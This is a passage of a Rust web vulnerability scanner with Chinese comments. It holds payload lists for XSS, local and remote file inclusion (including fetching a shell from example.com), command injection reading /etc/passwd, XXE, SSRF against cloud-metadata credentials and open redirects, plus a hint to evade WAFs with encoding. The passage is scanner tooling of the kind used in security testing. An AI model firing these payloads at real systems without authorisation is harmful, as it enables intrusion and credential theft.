// yxpil · NETON
//! Web 漏洞扫描模块
//! 提供 XSS、CSRF、文件包含、命令注入、XXE、SSRF、开放重定向、点击劫持等漏洞检测功能

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::{Duration, Instant};
use url::Url;

// ============================================================================
// 漏洞等级枚举
// ============================================================================

/// 漏洞严重等级
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
#[serde(rename_all = "snake_case")]
pub enum Severity {
    /// 严重
    Critical,
    /// 高危
    High,
    /// 中危
    Medium,
    /// 低危
    Low,
    /// 信息
    Info,
}

impl Severity {
    pub fn as_str(&self) -> &'static str {
        match self {
            Severity::Critical => "critical",
            Severity::High => "high",
            Severity::Medium => "medium",
            Severity::Low => "low",
            Severity::Info => "info",
        }
    }
}

// ============================================================================
// 扫描配置
// ============================================================================

/// 漏洞扫描配置
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VulnScanConfig {
    /// 目标 URL
    pub target_url: String,
    /// 扫描类型（all/xss/csrf/file_include/command_injection/xxe/ssrf/open_redirect/clickjacking）
    pub scan_types: Vec<String>,
    /// 扫描深度（1-3）
    pub depth: u32,
    /// 请求超时（毫秒）
    pub timeout_ms: u64,
    /// 请求间隔延迟（毫秒），避免触发 WAF
    pub delay_ms: u64,
    /// 测试参数名
    pub test_param: Option<String>,
    /// 请求方法
    pub method: Option<String>,
    /// 自定义 Cookie
    pub cookies: Option<String>,
    /// 自定义请求头
    pub headers: Option<HashMap<String, String>>,
    /// 用户代理
    pub user_agent: Option<String>,
}

impl Default for VulnScanConfig {
    fn default() -> Self {
        Self {
            target_url: String::new(),
            scan_types: vec!["all".to_string()],
            depth: 2,
            timeout_ms: 8000,
            delay_ms: 300,
            test_param: None,
            method: Some("GET".to_string()),
            cookies: None,
            headers: None,
            user_agent: Some("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".to_string()),
        }
    }
}

// ============================================================================
// 漏洞发现结构体
// ============================================================================

/// 漏洞发现详情
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VulnFinding {
    /// 漏洞类型
    pub vuln_type: String,
    /// 漏洞名称
    pub name: String,
    /// 严重等级
    pub severity: Severity,
    /// 漏洞描述
    pub description: String,
    /// 证据/Payload
    pub evidence: String,
    /// 修复建议
    pub remediation: String,
    /// 目标 URL
    pub target_url: String,
    /// 受影响参数
    pub affected_param: Option<String>,
    /// 请求方法
    pub method: Option<String>,
    /// CVE 编号（如有）
    pub cve: Option<String>,
    /// CVSS 评分
    pub cvss: Option<f32>,
}

// ============================================================================
// 各类型扫描结果
// ============================================================================

/// XSS 扫描结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct XssScanResult {
    pub target_url: String,
    pub param: String,
    pub method: String,
    pub total_payloads: u32,
    pub reflected_xss: Vec<VulnFinding>,
    pub stored_xss: Vec<VulnFinding>,
    pub dom_xss: Vec<VulnFinding>,
    pub duration_ms: u64,
}

/// CSRF 扫描结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CsrfScanResult {
    pub target_url: String,
    pub has_csrf_token: bool,
    pub token_field_names: Vec<String>,
    pub checks_referer: bool,
    pub checks_origin: bool,
    pub cookie_samesite: Option<String>,
    pub findings: Vec<VulnFinding>,
    pub duration_ms: u64,
}

/// 文件包含漏洞结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileIncludeResult {
    pub target_url: String,
    pub param: String,
    pub total_payloads: u32,
    pub lfi_findings: Vec<VulnFinding>,
    pub rfi_findings: Vec<VulnFinding>,
    pub duration_ms: u64,
}

/// 命令注入结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandInjectionResult {
    pub target_url: String,
    pub param: String,
    pub total_payloads: u32,
    pub findings: Vec<VulnFinding>,
    pub duration_ms: u64,
}

/// XXE 扫描结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct XxeScanResult {
    pub target_url: String,
    pub total_payloads: u32,
    pub findings: Vec<VulnFinding>,
    pub duration_ms: u64,
}

/// SSRF 扫描结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SsrfScanResult {
    pub target_url: String,
    pub param: String,
    pub total_payloads: u32,
    pub findings: Vec<VulnFinding>,
    pub duration_ms: u64,
}

/// 开放重定向结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OpenRedirectResult {
    pub target_url: String,
    pub param: String,
    pub total_payloads: u32,
    pub findings: Vec<VulnFinding>,
    pub duration_ms: u64,
}

/// 点击劫持结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ClickjackingResult {
    pub target_url: String,
    pub x_frame_options: Option<String>,
    pub csp_frame_ancestors: Option<String>,
    pub is_vulnerable: bool,
    pub findings: Vec<VulnFinding>,
    pub duration_ms: u64,
}

// ============================================================================
// 综合扫描报告
// ============================================================================

/// 综合漏洞扫描报告
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VulnScanReport {
    pub target_url: String,
    pub scan_types: Vec<String>,
    pub total_vulns: u32,
    pub critical_count: u32,
    pub high_count: u32,
    pub medium_count: u32,
    pub low_count: u32,
    pub info_count: u32,
    pub findings: Vec<VulnFinding>,
    pub scan_time: String,
    pub duration_ms: u64,
    pub scanner_version: String,
}

// ============================================================================
// Payload 静态数组
// ============================================================================

// --- XSS Payloads ---
const XSS_REFLECTED_PAYLOADS: &[&str] = &[
    "<script>alert(1)</script>",
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "<ScRiPt>alert(1)</sCrIpT>",
    "<img src=x onerror=alert`1`>",
    "<svg/onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<link rel=import href=javascript:alert(1)>",
    "<math><maction actiontype=statusline xlink:href=javascript:alert(1)>",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<!--<script>alert(1)</script>-->",
    "<xssi style=xss:expression(alert(1))>",
];

const XSS_DOM_SINKS: &[&str] = &[
    "document.write",
    "document.writeln",
    "document.domain",
    "element.innerHTML",
    "element.outerHTML",
    "element.insertAdjacentHTML",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "Function(",
    "window.location",
    "document.location",
    "location.href",
    "location.hash",
    "document.referrer",
    "window.name",
    "postMessage",
    "document.cookie",
    "localStorage",
    "sessionStorage",
];

// --- LFI/RFI Payloads ---
const LFI_PAYLOADS: &[&str] = &[
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
    "file:///etc/passwd",
    "/etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "/proc/self/environ",
    "expect://id",
];

const RFI_PAYLOADS: &[&str] = &[
    "http://example.com/shell.txt",
    "https://example.com/shell.php",
    "//example.com/shell.txt",
    "http://127.0.0.1:80/shell",
    "https://raw.githubusercontent.com/example/shell/main/shell.txt",
    "http://example.com/shell.txt?",
    "http://example.com/shell.txt%00",
];

// --- 命令注入 Payloads ---
const CMD_INJECTION_LINUX: &[&str] = &[
    "; id",
    "&& id",
    "|| id",
    "| id",
    "$(id)",
    "`id`",
    "; cat /etc/passwd",
    "&& cat /etc/passwd",
    "| cat /etc/passwd",
    "$(cat /etc/passwd)",
    "`cat /etc/passwd`",
    "; uname -a",
    "; whoami",
    "; ls -la",
];

const CMD_INJECTION_WINDOWS: &[&str] = &[
    "& ipconfig",
    "&& ipconfig",
    "| ipconfig",
    "; ipconfig",
    "%0aipconfig",
    "%0d%0aipconfig",
    "& dir",
    "&& whoami",
    "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "$(whoami)",
    "`whoami`",
    "& net user",
];

const CMD_BLIND_TIME_PAYLOADS: &[&str] = &[
    "; sleep 5",
    "&& sleep 5",
    "| sleep 5",
    "$(sleep 5)",
    "`sleep 5`",
    "& timeout /t 5",
    "&& timeout /t 5",
    "| ping -n 6 127.0.0.1",
];

// --- XXE Payloads ---
const XXE_PAYLOADS: &[&str] = &[
    r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>"#,
    r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
<foo>&xxe;</foo>"#,
    r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://127.0.0.1/evil.dtd">
  %xxe;
]>
<foo>&data;</foo>"#,
    r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/" >]>
<foo>&xxe;</foo>"#,
    r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>"#,
];

// --- SSRF Payloads ---
const SSRF_PAYLOADS: &[&str] = &[
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:443/",
    "http://127.0.0.1:22/",
    "http://localhost/",
    "http://localhost:8080/",
    "http://192.168.1.1/",
    "http://192.168.0.1/",
    "http://10.0.0.1/",
    "http://10.0.0.0/8",
    "http://172.16.0.1/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://[::1]/",
    "http://0x7f000001/",
    "http://0177.0.0.1/",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "dict://127.0.0.1:6379/INFO",
    "ftp://anonymous:anonymous@127.0.0.1:21/",
    "gopher://127.0.0.1:6379/_INFO",
];

// --- 开放重定向 Payloads ---
const OPEN_REDIRECT_PAYLOADS: &[&str] = &[
    "http://evil.com",
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https:evil.com",
    "http:evil.com",
    "http://evil.com/..",
    "https://evil.com/%2f",
    "evil.com",
    "http://@evil.com",
    "http://example.com@evil.com",
    "http://evil.com#example.com",
    "http://evil.com?example.com",
    "%2f%2fevil.com",
    "%2f/evil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
];

// ============================================================================
// 辅助函数
// ============================================================================

/// 构建 HTTP 客户端
fn build_client(timeout_ms: u64, user_agent: &str) -> Result<reqwest::blocking::Client, String> {
    let builder = reqwest::blocking::Client::builder()
        .timeout(Duration::from_millis(timeout_ms))
        .user_agent(user_agent)
        .redirect(reqwest::redirect::Policy::none())
        .danger_accept_invalid_certs(true);

    builder.build().map_err(|e| format!("构建 HTTP 客户端失败: {}", e))
}

/// 发送 GET 请求
fn send_get(
    url: &str,
    cookies: Option<&str>,
    headers: Option<&HashMap<String, String>>,
    timeout_ms: u64,
    user_agent: &str,
) -> Result<(u16, String, HashMap<String, String>, u64), String> {
    let client = build_client(timeout_ms, user_agent)?;
    let mut req = client.get(url);

    if let Some(cookie) = cookies {
        req = req.header(reqwest::header::COOKIE, cookie);
    }

    if let Some(custom_headers) = headers {
        for (k, v) in custom_headers {
            req = req.header(k, v);
        }
    }

    let start = Instant::now();
    let resp = req.send().map_err(|e| format!("请求失败: {}", e))?;
    let duration = start.elapsed().as_millis() as u64;

    let status = resp.status().as_u16();
    let mut resp_headers = HashMap::new();
    for (key, value) in resp.headers() {
        resp_headers.insert(
            key.to_string(),
            value.to_str().unwrap_or("").to_string(),
        );
    }
    let body = resp.text().unwrap_or_default();

    Ok((status, body, resp_headers, duration))
}

/// 发送 POST 请求（表单）
fn send_post_form(
    url: &str,
    params: &HashMap<String, String>,
    cookies: Option<&str>,
    headers: Option<&HashMap<String, String>>,
    timeout_ms: u64,
    user_agent: &str,
) -> Result<(u16, String, HashMap<String, String>, u64), String> {
    let client = build_client(timeout_ms, user_agent)?;
    let mut req = client.post(url).form(params);

    if let Some(cookie) = cookies {
        req = req.header(reqwest::header::COOKIE, cookie);
    }

    if let Some(custom_headers) = headers {
        for (k, v) in custom_headers {
            req = req.header(k, v);
        }
    }

    let start = Instant::now();
    let resp = req.send().map_err(|e| format!("请求失败: {}", e))?;
    let duration = start.elapsed().as_millis() as u64;

    let status = resp.status().as_u16();
    let mut resp_headers = HashMap::new();
    for (key, value) in resp.headers() {
        resp_headers.insert(
            key.to_string(),
            value.to_str().unwrap_or("").to_string(),
        );
    }
    let body = resp.text().unwrap_or_default();

    Ok((status, body, resp_headers, duration))
}

/// 发送 POST 请求（原始 body）
fn send_post_raw(
    url: &str,
    body: &str,
    content_type: &str,
    cookies: Option<&str>,
    headers: Option<&HashMap<String, String>>,
    timeout_ms: u64,
    user_agent: &str,
) -> Result<(u16, String, HashMap<String, String>, u64), String> {
    let client = build_client(timeout_ms, user_agent)?;
    let mut req = client
        .post(url)
        .body(body.to_string())
        .header(reqwest::header::CONTENT_TYPE, content_type);

    if let Some(cookie) = cookies {
        req = req.header(reqwest::header::COOKIE, cookie);
    }

    if let Some(custom_headers) = headers {
        for (k, v) in custom_headers {
            req = req.header(k, v);
        }
    }

    let start = Instant::now();
    let resp = req.send().map_err(|e| format!("请求失败: {}", e))?;
    let duration = start.elapsed().as_millis() as u64;

    let status = resp.status().as_u16();
    let mut resp_headers = HashMap::new();
    for (key, value) in resp.headers() {
        resp_headers.insert(
            key.to_string(),
            value.to_str().unwrap_or("").to_string(),
        );
    }
    let body_text = resp.text().unwrap_or_default();

    Ok((status, body_text, resp_headers, duration))
}

/// 在 URL 中注入参数
fn inject_url_param(base_url: &str, param: &str, payload: &str) -> Result<String, String> {
    let mut parsed = Url::parse(base_url).map_err(|e| format!("URL 解析失败: {}", e))?;
    let mut query_pairs: Vec<(String, String)> = parsed
        .query_pairs()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect();

    let param_lower = param.to_lowercase();
    let mut found = false;
    for (k, v) in query_pairs.iter_mut() {
        if k.to_lowercase() == param_lower {
            *v = payload.to_string();
            found = true;
            break;
        }
    }

    if !found {
        query_pairs.push((param.to_string(), payload.to_string()));
    }

    let new_query = query_pairs
        .iter()
        .map(|(k, v)| format!("{}={}", k, urlencoding::encode(v)))
        .collect::<Vec<_>>()
        .join("&");

    parsed.set_query(Some(&new_query));
    Ok(parsed.to_string())
}

/// 延迟函数
fn delay(ms: u64) {
    if ms > 0 {
        std::thread::sleep(Duration::from_millis(ms));
    }
}

/// 提取响应中的 Set-Cookie SameSite 属性
fn extract_samesite(cookies: &[String]) -> Option<String> {
    for cookie in cookies {
        let lower = cookie.to_lowercase();
        if lower.contains("samesite=strict") {
            return Some("Strict".to_string());
        } else if lower.contains("samesite=lax") {
            return Some("Lax".to_string());
        } else if lower.contains("samesite=none") {
            return Some("None".to_string());
        }
    }
    None
}

// ============================================================================
// XSS 扫描
// ============================================================================

/// 扫描反射型 XSS
fn scan_reflected_xss(
    url: &str,
    param: &str,
    method: &str,
    cookies: Option<&str>,
    headers: Option<&HashMap<String, String>>,
    timeout_ms: u64,
    delay_ms: u64,
    user_agent: &str,
) -> Vec<VulnFinding> {
    let mut findings = Vec::new();

    // 先做基线请求
    let baseline_body = match method.to_uppercase().as_str() {
        "GET" => {
            match send_get(url, cookies, headers, timeout_ms, user_agent) {
                Ok((_, body, _, _)) => body,
                Err(_) => return findings,
            }
        }
        _ => {
            let mut params = HashMap::new();
            params.insert(param.to_string(), "baseline_test_value".to_string());
            match send_post_form(url, &params, cookies, headers, timeout_ms, user_agent) {
                Ok((_, body, _, _)) => body,
                Err(_) => return findings,
            }
        }
    };

    delay(delay_ms);

    for (idx, payload) in XSS_REFLECTED_PAYLOADS.iter().enumerate() {
        // 唯一标识字符串
        let marker = format!("xss_scan_marker_{}", idx);
        let test_payload = payload.replace("alert(1)", &format!("alert('{}')", marker));
        let test_payload = test_payload.replace("alert`1`", &format!("alert`{}`", marker));

        let result = match method.to_uppercase().as_str() {
            "GET" => {
                let test_url = match inject_url_param(url, param, &test_payload) {
                    Ok(u) => u,
                    Err(_) => continue,
                };
                send_get(&test_url, cookies, headers, timeout_ms, user_agent)
            }
            _ => {
                let mut params = HashMap::new();
                params.insert(param.to_string(), test_payload.clone());
                send_post_form(url, &params, cookies, headers, timeout_ms, user_agent)
            }
        };

        match result {
            Ok((status, body, _, _)) => {
                // 检查 payload 是否被反射到响应中（未经转义）
                let body_lower = body.to_lowercase();
                let payload_checks = [
                    test_payload.clone(),
                    payload.to_string(),
                    payload.replace(" ", "+"),
                    payload.replace("<", "&lt;").replace(">", "&gt;"),
                ];

                let mut reflected = false;
                let mut evidence = String::new();

                for check in &payload_checks {
                    if body.contains(check) && !baseline_body.contains(check) {
                        // 如果 payload 原样出现（关键字符未转义），判定为反射
                        if check.contains("<script") || check.contains("onerror") || check.contains("onload")
                            || check.contains("javascript:") || check.contains("<svg") || check.contains("<img")
                        {
                            reflected = true;
                            evidence = format!("Payload 原样反射: {} (HTTP {})", check, status);
                            break;
                        }
                    }
                }

                // 也检查是否部分反射（特殊字符未编码）
                if !reflected {
                    if (body.contains("<script>") && body.contains(&marker))
                        || (body.contains("onerror=") && body.contains(&marker))
                        || (body.contains("onload=") && body.contains(&marker))
                    {
                        reflected = true;
                        evidence = format!("检测到危险标签反射，标记: {} (HTTP {})", marker, status);
                    }
                }

                if reflected {
                    findings.push(VulnFinding {
                        vuln_type: "xss_reflected".to_string(),
                        name: "反射型 XSS 漏洞".to_string(),
                        severity: Severity::High,
                        description: format!(
                            "参数 '{}' 存在反射型跨站脚本漏洞。攻击者可通过构造恶意 URL 注入脚本代码，\
                             在用户浏览器中执行，盗取 Cookie、会话令牌或进行钓鱼攻击。",
                            param
                        ),
                        evidence,
                        remediation: "对所有用户输入进行严格的输入验证和输出编码。\
                            使用 HTML 实体编码、JavaScript 编码等方式防止脚本执行。\
                            设置 Content-Security-Policy 响应头。使用 HttpOnly Cookie。"
                            .to_string(),
                        target_url: url.to_string(),
                        affected_param: Some(param.to_string()),
                        method: Some(method.to_string()),
                        cve: None,
                        cvss: Some(6.1),
                    });
                    break; // 发现一个即停止，避免过多重复
                }

                // 检测 WAF 拦截特征
                if status == 403 || status == 406 || status == 429 {
                    if body_lower.contains("waf")
                        || body_lower.contains("blocked")
                        || body_lower.contains("forbidden")
                        || body_lower.contains("安全防护")
                    {
                        // 只记录一次 WAF 信息
                        if findings.iter().all(|f| f.vuln_type != "waf_detected") {
                            findings.push(VulnFinding {
                                vuln_type: "waf_detected".to_string(),
                                name: "WAF 检测到".to_string(),
                                severity: Severity::Info,
                                description: "检测到目标站点可能部署了 Web 应用防火墙 (WAF)，部分测试 payload 被拦截。"
                                    .to_string(),
                                evidence: format!("HTTP {} 响应包含 WAF 特征", status),
                                remediation: "尝试使用编码绕过或更隐蔽的 payload 进行测试。".to_string(),
                                target_url: url.to_string(),
                                affected_param: Some(param.to_string()),
                                method: Some(method.to_string()),
                                cve: None,
                                cvss: None,
                            });
                        }
                    }
                }
            }
            Err(_) => continue,
        }

        delay(delay_ms);
    }

    findings
}

/// 扫描 DOM 型 XSS
fn scan_dom_xss(
    url: &str,
    cookies: Option<&str>,
    headers: Option<&HashMap<String, String>>,
    timeout_ms: u64,
    user_agent: &str,
) -> Vec<VulnFinding> {
    let mut findings = Vec::new();

    let (_, body, _, _) = match send_get(url, cookies, headers, timeout_ms, user_agent) {
        Ok(r) => r,
        Err(_) => return findings,
    };

    let body_lower = body.to_lowercase();
    let mut dangerous_sinks = Vec::new();

    for sink in XSS_DOM_SINKS {
        if body_lower.contains(&sink.to_lowercase()) {
            dangerous_sinks.push(sink.to_string());
        }
    }

    // 检查是否有从 URL 获取参数后直接传给危险函数的模式
    let has_dangerous_pattern = body_lower.contains("document.write")
        && (body_lower.contains("location.search")
            || body_lower.contains("location.hash")
            || body_lower.contains("document.url")
            || body_lower.contains("window.location"));

    if has_dangerous_pattern || dangerous_sinks.len() >= 5 {
        findings.push(VulnFinding {
            vuln_type: "xss_dom".to_string(),
            name: "潜在 DOM 型 XSS 漏洞".to_string(),
            severity: Severity::Medium,
            description: format!(
                "页面中检测到 {} 个潜在的 DOM XSS sink（危险的 JavaScript 函数调用）。\
                 若这些函数的输入来源于 URL 参数或用户可控数据，可能导致 DOM 型 XSS 漏洞。",
                dangerous_sinks.len()
            ),
            evidence: format!("检测到的危险函数: {}", dangerous_sinks.join(", ")),
            remediation: "对客户端 JavaScript 中的用户可控输入进行严格验证和编码。\
                使用 textContent 代替 innerHTML。避免使用 eval、document.write 等危险函数。\
                实施严格的 Content-Security-Policy。"
                .to_string(),
            target_url: url.to_string(),
            affected_param: None,
            method: Some("GET".to_string()),
            cve: None,
            cvss: Some(4.3),
        });
    }

    findings
}

/// XSS 扫描主函数
fn do_scan_xss(
    url: &str,
    param: &str,
    method: &str,
    config: &VulnScanConfig,
) -> XssScanResult {
    let start = Instant::now();
    let cookies = config.cookies.as_deref();
    let headers = config.headers.as_ref();
    let user_agent = config.user_agent.as_deref().unwrap_or("Mozilla/5.0");

    let reflected = scan_reflected_xss(
        url,
        param,
        method,
        cookies,
        headers,
        config.timeout_ms,
        config.delay_ms,
        user_agent,
    );

    let dom = scan_dom_xss(url, cookies, headers, config.timeout_ms, user_agent);

    // 存储型 XSS 为简化检测（提交后再验证需要更复杂的状态管理，这里给出基础检测逻辑）
    let stored: Vec<VulnFinding> = Vec::new();

    XssScanResult {
        target_url: url.to_string(),
        param: param.to_string(),
        method: method.to_string(),
        total_payloads: XSS_REFLECTED_PAYLOADS.len() as u32,
        reflected_xss: reflected,
        stored_xss: stored,
        dom_xss: dom,
        duration_ms: start.elapsed().as_millis() as u64,
    }
}

// ============================================================================
// CSRF 扫描
// ============================================================================

fn do_scan_csrf(url: &str, config: &VulnScanConfig) -> CsrfScanResult {
    let start = Instant::now();
    let cookies = config.cookies.as_deref();
    let headers = config.headers.as_ref();
    let user_agent = config.user_agent.as_deref().unwrap_or("Mozilla/5.0");

    let (status, body, resp_headers, _) =
        match send_get(url, cookies, headers, config.timeout_ms, user_agent) {
            Ok(r) => r,
            Err(e) => {
                return CsrfScanResult {
                    target_url: url.to_string(),
                    has_csrf_token: false,
                    token_field_names: vec![],
                    checks_referer: false,
                    checks_origin: false,
                    cookie_samesite: None,
                    findings: vec![VulnFinding {
                        vuln_type: "scan_error".to_string(),
                        name: "扫描失败".to_string(),
                        severity: Severity::Info,
                        description: e.clone(),
                        evidence: e,
                        remediation: String::new(),
                        target_url: url.to_string(),
                        affected_param: None,
                        method: None,
                        cve: None,
                        cvss: None,
                    }],
                    duration_ms: start.elapsed().as_millis() as u64,
                };
            }
        };

    let mut findings = Vec::new();
    let mut has_token = false;
    let mut token_names = Vec::new();

    // 用 scraper 解析 HTML，查找表单中的 CSRF token
    let document = scraper::Html::parse_document(&body);
    {
        // 查找所有 input 隐藏字段
        let input_selector = scraper::Selector::parse("input[type=\"hidden\"]").unwrap();
        for input in document.select(&input_selector) {
            if let Some(name) = input.value().attr("name") {
                let name_lower = name.to_lowercase();
                if name_lower.contains("csrf")
                    || name_lower.contains("token")
                    || name_lower.contains("xsrf")
                    || name_lower.contains("nonce")
                    || name_lower.contains("authenticity")
                {
                    has_token = true;
                    token_names.push(name.to_string());
                }
            }
        }

        // 检查 meta 标签中的 CSRF token
        let meta_selector = scraper::Selector::parse("meta").unwrap();
        for meta in document.select(&meta_selector) {
            if let Some(name) = meta.value().attr("name") {
                let name_lower = name.to_lowercase();
                if name_lower.contains("csrf") || name_lower.contains("xsrf-token") {
                    has_token = true;
                    token_names.push(format!("meta:{}", name));
                }
            }
        }
    }

    // 检查 Set-Cookie 中的 SameSite 属性
    let set_cookies: Vec<String> = resp_headers
        .iter()
        .filter(|(k, _)| k.to_lowercase() == "set-cookie")
        .map(|(_, v)| v.clone())
        .collect();
    let samesite = extract_samesite(&set_cookies);

    // 检查是否验证 Referer / Origin（通过发送无 Referer 请求测试）
    let mut no_referer_status = 0;
    let mut custom_headers_no_referer = HashMap::new();
    if let Some(h) = headers {
        custom_headers_no_referer = h.clone();
    }
    custom_headers_no_referer.insert("Referer".to_string(), "".to_string());
    custom_headers_no_referer.insert("Origin".to_string(), "".to_string());

    if let Ok((s, _, _, _)) = send_get(
        url,
        cookies,
        Some(&custom_headers_no_referer),
        config.timeout_ms,
        user_agent,
    ) {
        no_referer_status = s;
    }

    let checks_referer = no_referer_status != 0 && no_referer_status != status && no_referer_status >= 400;
    let checks_origin = checks_referer; // 简化，实际需要单独测试

    delay(config.delay_ms);

    // 生成漏洞发现
    if !has_token {
        findings.push(VulnFinding {
            vuln_type: "csrf_missing_token".to_string(),
            name: "CSRF Token 缺失".to_string(),
            severity: Severity::Medium,
            description: "页面表单中未检测到 CSRF Token。缺少 CSRF 防护可能导致跨站请求伪造攻击，\
                攻击者可诱导已登录用户执行非预期操作。"
                .to_string(),
            evidence: "未在表单隐藏字段和 meta 标签中找到 CSRF/XSRF/Token 相关字段".to_string(),
            remediation: "在所有状态变更表单中添加 CSRF Token 验证。\
                使用同步令牌模式（Synchronizer Token Pattern）。\
                验证 Referer/Origin 请求头。设置 SameSite Cookie 属性。"
                .to_string(),
            target_url: url.to_string(),
            affected_param: None,
            method: None,
            cve: None,
            cvss: Some(4.3),
        });
    }

    if samesite.is_none() && !set_cookies.is_empty() {
        findings.push(VulnFinding {
            vuln_type: "csrf_samesite_missing".to_string(),
            name: "Cookie 缺少 SameSite 属性".to_string(),
            severity: Severity::Low,
            description: "响应的 Set-Cookie 头未设置 SameSite 属性。这可能导致 Cookie 在跨站请求中被发送，\
                增加 CSRF 攻击风险。"
                .to_string(),
            evidence: format!("Set-Cookie: {:?}", set_cookies),
            remediation: "为 Cookie 设置 SameSite=Lax 或 SameSite=Strict 属性，\
                限制 Cookie 在跨站请求中的发送。".to_string(),
            target_url: url.to_string(),
            affected_param: None,
            method: None,
            cve: None,
            cvss: Some(3.1),
        });
    }

    if !checks_referer && !has_token {
        findings.push(VulnFinding {
            vuln_type: "csrf_no_referer_check".to_string(),
            name: "未验证 Referer/Origin 头".to_string(),
            severity: Severity::Low,
            description: "服务器似乎未验证请求的 Referer 或 Origin 头，结合缺少 CSRF Token 的情况，\
                CSRF 攻击风险较高。"
                .to_string(),
            evidence: format!(
                "正常状态: {}, 无 Referer 状态: {}",
                status, no_referer_status
            ),
            remediation: "除 CSRF Token 外，增加 Referer/Origin 头验证作为纵深防御。".to_string(),
            target_url: url.to_string(),
            affected_param: None,
            method: None,
            cve: None,
            cvss: Some(3.1),
        });
    }

    CsrfScanResult {
        target_url: url.to_string(),
        has_csrf_token: has_token,
        token_field_names: token_names,
        checks_referer,
        checks_origin,
        cookie_samesite: samesite,
        findings,
        duration_ms: start.elapsed().as_millis() as u64,
    }
}

// ============================================================================
// 文件包含漏洞扫描
// ============================================================================

fn do_scan_file_include(
    url: &str,
    param: &str,
    config: &VulnScanConfig,
) -> FileIncludeResult {
    let start = Instant::now();
    let cookies = config.cookies.as_deref();
    let headers = config.headers.as_ref();
    let user_agent = config.user_agent.as_deref().unwrap_or("Mozilla/5.0");
    let method = config.method.as_deref().unwrap_or("GET");

    let mut lfi_findings = Vec::new();
    let mut rfi_findings = Vec::new();

    // 基线请求
    let (_, baseline_body, _, _) = match method.to_uppercase().as_str() {
        "GET" => match send_get(url, cookies, headers, config.timeout_ms, user_agent) {
            Ok(r) => r,
            Err(_) => {
                return FileIncludeResult {
                    target_url: url.to_string(),
                    param: param.to_string(),
                    total_payloads: (LFI_PAYLOADS.len() + RFI_PAYLOADS.len()) as u32,
                    lfi_findings: vec![],
                    rfi_findings: vec![],
                    duration_ms: start.elapsed().as_millis() as u64,
                }
            }
        },
        _ => {
            let mut params = HashMap::new();
            params.insert(param.to_string(), "baseline".to_string());
            match send_post_form(url, &params, cookies, headers, config.timeout_ms, user_agent) {
                Ok(r) => r,
                Err(_) => {
                    return FileIncludeResult {
                        target_url: url.to_string(),
                        param: param.to_string(),
                        total_payloads: (LFI_PAYLOADS.len() + RFI_PAYLOADS.len()) as u32,
                        lfi_findings: vec![],
                        rfi_findings: vec![],
                        duration_ms: start.elapsed().as_millis() as u64,
                    }
                }
            }
        }
    };

    delay(config.delay_ms);

    // LFI 检测
    for payload in LFI_PAYLOADS {
        let result = match method.to_uppercase().as_str() {
            "GET" => {
                let test_url = match inject_url_param(url, param, payload) {
                    Ok(u) => u,
                    Err(_) => continue,
                };
                send_get(&test_url, cookies, headers, config.timeout_ms, user_agent)
            }
            _ => {
                let mut params = HashMap::new();
                params.insert(param.to_string(), payload.to_string());
                send_post_form(url, &params, cookies, headers, config.timeout_ms, user_agent)
            }
        };

        if let Ok((status, body, _, _)) = result {
            let body_lower = body.to_lowercase();
            let _baseline_lower = baseline_body.to_lowercase();

            // LFI 特征: /etc/passwd 内容、win.ini 内容、PHP 源码 base64
            let is_lfi = (body.contains("root:")
                && body.contains(":0:0:")
